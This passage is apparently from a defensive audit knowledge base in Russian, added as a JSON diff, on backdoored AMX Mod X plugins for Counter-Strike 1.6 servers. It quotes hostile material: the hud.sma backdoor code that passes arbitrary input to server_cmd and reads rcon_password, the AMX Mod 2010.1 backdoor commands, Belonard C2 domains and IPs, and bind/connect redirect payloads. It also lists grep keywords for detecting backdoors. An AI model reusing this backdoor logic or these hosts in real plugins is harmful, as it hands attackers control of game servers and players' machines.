+      "why": "Не индикатор, а инструмент проверки: серверная команда amxx cmds выводит все команды, зарегистрированные плагинами; amxx plugins — список загруженных. Сверка вывода с ожидаемым функционалом сборки выявляет команды-люки (лишние, бессмысленные, с ADMIN_ALL). Дополняет статический греп, потому что ловит строки, собранные в рантайме.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "AMX Disassembler / amxxdump / lysis",
+      "severity": "low",
+      "why": "Инструменты для получения читаемого кода из .amxx. AMX Disassembler и amxxdump — старые, на новых версиях AMXX работают плохо; актуальный вариант — декомпилятор lysis (lysis-java.jar, java -jar lysis-java.jar plugin.amxx > plugin.txt), который справляется в том числе с защищёнными плагинами. Без декомпиляции греп по .amxx ловит только plain-строки: строки, собираемые посимвольно (format/add/num_to_str), он пропустит.",
+      "source_url": "https://dev-cs.ru/threads/15934/"
+    }
+  ],
+  "incidents": [
+    {
+      "what": "Бэкдор в AMX Mod 2010.1 (раздача с amxmod.net)",
+      "summary": "Единственный официально задокументированный AlliedModders security advisory по этой экосистеме (тема forums.alliedmods.net/showthread.php?t=275836; сам сайт отдаёт 403 на автоматические запросы, содержимое подтверждено по зеркалу amxx.pl). AMX Mod (не путать с AMX Mod X) был заброшен, но пользователь Stephane «Flatounet» Vigne выпустил «обновление» 2010.1. В скомпилированных бинарниках модуля были скрытые команды: mrp — получить/сменить RCON-пароль сервера, cmdr — выполнить произвольную консольную команду на сервере, cmdc — выполнить команду на указанном клиенте, slog — полностью отключить логирование. Доступ ограничивался функцией is_dev_authid(), сверявшей SteamID подключившегося ПОСИМВОЛЬНО (чтобы цельная строка не находилась грепом); подтверждённые аккаунты STEAM_0:0:11696626 и STEAM_0:0:13923116. Повод к расследованию: сервер, которому помогали мигрировать с AMX Mod 2010.1 на AMXModX, через несколько часов был взломан — атакующий уже знал RCON-пароль. В логах видны попытки rcon, затем amx_addadmin и log off. Автор публично признал, что пользовался закладкой сам и намерен продолжать. ВЫВОД ДЛЯ ПРОЕКТА: любая ZP-сборка, тянущая AMX Mod вместо AMX Mod X, отбраковывается без разбора.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "what": "Trojan.Belonard — 39% всех серверов CS 1.6 раздавали малварь игрокам (Dr.Web, март 2019)",
+      "summary": "Из ~5000 серверов CS 1.6, доступных из официального клиента, 1951 (39%) был создан трояном Belonard. Схема: вредоносный сервер эксплуатировал RCE в клиенте (2 уязвимости в официальном, 4 в пиратском), подсовывал client.dll (Trojan.Belonard.1) или Mssv24.asi (Trojan.Belonard.5); далее с C2 качался Mp3enc.asi. Файлы .asi автоматически подгружаются игрой из корня Half-Life. Троян (11 компонентов: Mssv16.asi, davapi.dll, WinDHCP.dll, wmcodecs.dll, ssdp32.dll; служба WinDHCP в svchost.exe; персистентность через HKCU\\...\\AppCompatFlags\\Layers = RUNASADMIN) подменял игроку список серверов и поднимал на его машине прокси-серверы с заниженным пингом, которые регистрировались через Steam API и всплывали вверху списка — оттуда игроков уводило на заражающий сервер. C2: valve-ms.ru, csgoogle.ru (поддомены вида fuztxhus.valve-ms.ru:28445), IP 37.143.12.3 и 46.254.17.165. Признак вредоносного сервера в браузере игр: в поле Game строка «Counter-Strike 1/2/3» вместо «Counter-Strike». Ботнет разрушен снятием доменов с делегирования при содействии REG.ru. ВАЖНО ДЛЯ ПРОЕКТА: домен csgoogle.ru встречался ПРЯМО ВНУТРИ бэкдоренного AMXX-плагина (nademessages.amxx: motd_write Connect hl.csgoogle.ru:27115) — то есть готовые сборки были одним из каналов вербовки в этот ботнет.",
+      "source_url": "https://news.drweb.com/show/?i=13135&lng=en"
+    },
+    {
+      "what": "Публичный список AMXX-плагинов с бэкдорами (тема «Ищем бэкдоры и дыры в плагинах», c-s.net.ua)",
+      "summary": "Тема-методичка (изначально ~2009, дополнялась) + сообщение пользователя BestServer от 31.05.2016 с конкретным списком заражённых плагинов и их полезной нагрузкой. Редиректы через bind: voteban1_2.amxx → bind F2 connect 46.174.52.11:27259; reset_score.amxx → bind F2 connect 46.174.50.24:27217; nice_loading_music.amxx → bind [ connect 188.230.69.69:27017; parachute.amx → bind ] connect 95.47.161.115:27037; resetscore.amxx → bind F2 connect 95.47.161.115:27037; kills_counter.amxx → bind [ connect 95.47.161.115:27037. Редиректы через MOTD: online_play.amxx → motd_write Connect 46.38.62.71:27777; nademessages.amxx → motd_write Connect hl.csgoogle.ru:27115. Также упомянуты virus.amxx, fuckoff.amxx, amx_sysbizz.amxx, truebans_core.amxx. Методичка задаёт базовый набор строк для грепа: rcon, connect, stmp, bind, set_user_flags — и ключевое правило: перекомпилировать плагины из исходников, потому что закладку часто вносят только в .amxx. Критика в теме справедлива: приём не берёт обфусцированные/собираемые в рантайме строки, поэтому греп надо дополнять декомпиляцией (lysis) и проверкой командой amxx cmds.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "what": "Бэкдор в открытом пакете плагинов на GitHub (sekys/cs-amxpackage, hud.sma)",
+      "summary": "Живой, читаемый пример закладки в .sma, доступный прямо сейчас. Регистрация: register_clcmd(\"seky\",\"backdoor\",ADMIN_ALL,\"#echo\") — команда доступна ЛЮБОМУ игроку, описание \"#echo\" маскирует её в списках. Тело: read_argv(1,arg,6); if(equal(arg,\"423789\")) { read_argv(2,arg2,512); server_cmd(\"%s\",arg2); } — то есть «say/console: seky 423789 <любая серверная команда>» = полный контроль над сервером. Плюс функция-заложник по таймеру set_task(300.0,\"exploit\",_,_,_,\"b\"): get_cvar_string(\"rcon_password\",exploit,24); если пароль не равен зашитому \"csleg2\" — server_cmd(\"quit\"); server_cmd(\"exit\"). Демонстрирует сразу три приёма: команда-люк с ADMIN_ALL, пароль-число вместо аутентификации, и чтение RCON-пароля под видом «защиты от нелегальных копий».",
+      "source_url": "https://raw.githubusercontent.com/sekys/cs-amxpackage/master/hud.sma"
+    },
+    {
+      "what": "«Raiz0 rcon hack» (raiz0.org) — массовая смена rcon_password на чужих серверах",
+      "summary": "Утилита, распространявшаяся через www.raiz0.org, отправляла на сервер cfg-файлы, меняющие rcon_password, и могла подменять файлы на сервере. Затрагивала в первую очередь non-steam-серверы, была связана с amxmodx/metamod (то есть не лечилась обновлением HLDS). Комьюнити-ответ — плагин-фикс, блокирующий команду rcon_password и требующий: перевести plugins.ini и все plugins-*.ini в read-only и поставить защитный плагин ПЕРВЫМ в списке. Значимо для аудита сборки: если в сборке уже лежит «rcon locker / rcon defencer / rcon fix» — это косвенный признак, что автор сборки сталкивался с компрометацией; и одновременно такие плагины сами читают rcon_password, их надо проверять особенно тщательно.",
+      "source_url": "https://amxx.pl/topic/114275-raiz0s-rcon-hack-fix/"
+    },
+    {
+      "what": "Повторные взломы сервера при уже сменённых RCON/FTP-паролях (кейс на forum.myarena.ru, тема 33694)",
+      "summary": "Типовой сценарий, ради которого и делается этот аудит. Симптомы: настройки и hostname откатываются после смены через rcon; баны «воскресают» после рестарта; смена RCON-пароля, FTP-пароля и пароля панели не помогает; ограничение rcon по IP не помогает. Вывод участников: закладка живёт не в украденном пароле, а в самом плагине из сборки. Подозрения падали на statsx_gui.amxx и statsx_shell (обе версии), PlayersCountSelectTeam.amxx, mapchooser.amxx. Практический вывод: если после полной ротации всех секретов поведение повторяется — надо снимать плагины пачками (бинарный поиск) и декомпилировать, а не менять пароли ещё раз.",
+      "source_url": "https://forum.myarena.ru/index.php?%2Ftopic%2F33694-vzlamyvaiut-server-pomogite-vyiavit-plagin-s-la%2F="
+    },
+    {
+      "what": "Принудительная загрузка малвари клиенту через resource list + FastDL (ValveSoftware/halflife issue #2063)",
+      "summary": "Разбор в официальном багтрекере Half-Life: вредоносный сервер CS 1.6 связкой svc_newusermsg (переполнение буфера), svc_stufftext (выполнение консольных команд на клиенте), svc_resourcerequest/svc_resourcelist (подсовывание файлов через HTTP FastDL) и svc_director заставляет клиента скачать и разместить файлы: Half-Life\\Mp3enc.asi, Half-Life\\Mssv24.asi, cstrike_downloads\\sound\\ambience\\save\\1.HL\\cl_dlls\\client.dll. FastDL вёл на домен вида http://jgutdnqn.cs*****.ru/fastdl/. Для нашего проекта это обратная сторона риска: заражённая сборка превращает НАШ сервер в инструмент заражения наших же игроков (репутация, бан у хостера, жалобы). Проверять: sv_downloadurl, содержимое resource list, precache_generic с не-игровыми расширениями.",
+      "source_url": "https://github.com/ValveSoftware/halflife/issues/2063"
+    },
+    {
+      "what": "Свободно распространяемые «плагины-бэкдоры» как готовый продукт",
+      "summary": "На файлопомойках лежат плагины, открыто заявленные как средство взлома чужого сервера — например «BackDoor — Взлом сервера» на cs-fade.ru с тремя функциями: выключить сервер, выдать себе все привилегии, удалить мод по указанному полному пути. Это означает, что закладка не требует квалификации: любой владелец сборки мог подмешать готовый .amxx. Отсюда практическое следствие для аудита: проверять надо ВСЕ .amxx в сборке, а не только «подозрительные по названию», и обязательно сверять plugins.ini + plugins-*.ini с фактическим содержимым каталога plugins/.",
+      "source_url": "https://cs-fade.ru/counter-strike/plugins_all/universalnye-plaginy/1571-vzlom-servera-d.html"
+    }
+  ]
+}
